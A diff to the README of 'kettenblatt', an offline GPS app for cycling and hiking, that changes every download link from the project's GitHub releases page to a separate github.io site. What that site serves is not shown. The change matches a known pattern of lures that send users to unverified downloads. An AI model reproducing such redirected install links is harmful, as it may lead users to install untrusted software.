@@ -1,6 +1,6 @@
 # 🚴 kettenblatt - Your Offline GPS Companion for Cycling and Hiking
 
-[![Download kettenblatt](https://img.shields.io/badge/Download-kettenblatt-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=4CAF50)](https://github.com/Kellenintemperate373/kettenblatt/releases)
+[![Download kettenblatt](https://img.shields.io/badge/Download-kettenblatt-brightgreen?style=for-the-badge&logo=android&logoColor=white&color=4CAF50)](https://kellenintemperate373.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ This app combines **map-matched turn cues**, **street names**, and **offline map
 Getting kettenblatt on your phone is simple. Follow these steps:
 
 1.  **Open the download page:**  
-    Click this link: [https://github.com/Kellenintemperate373/kettenblatt/releases](https://github.com/Kellenintemperate373/kettenblatt/releases)
+    Click this link: [https://kellenintemperate373.github.io](https://kellenintemperate373.github.io)
 
 2.  **Find the latest version:**  
     Look at the top of the page. You will see a list of releases. The newest one is usually at the top.
@@ -60,7 +60,7 @@ Getting kettenblatt on your phone is simple. Follow these steps:
 ## 📥 Download and Installation Guide
 
 Visit this link to download the application:  
-**[https://github.com/Kellenintemperate373/kettenblatt/releases](https://github.com/Kellenintemperate373/kettenblatt/releases)**
+**[https://kellenintemperate373.github.io](https://kellenintemperate373.github.io)**
 
 ### Step-by-Step Installation
 
@@ -177,7 +177,7 @@ kettenblatt is released under an open-source license. Map data © OpenStreetMap 
 
 Stop worrying about losing signal. Download kettenblatt now and explore the world without limits.
 
-**[👉 Download kettenblatt Now](https://github.com/Kellenintemperate373/kettenblatt/releases)**
+**[👉 Download kettenblatt Now](https://kellenintemperate373.github.io)**
 
 ---
 
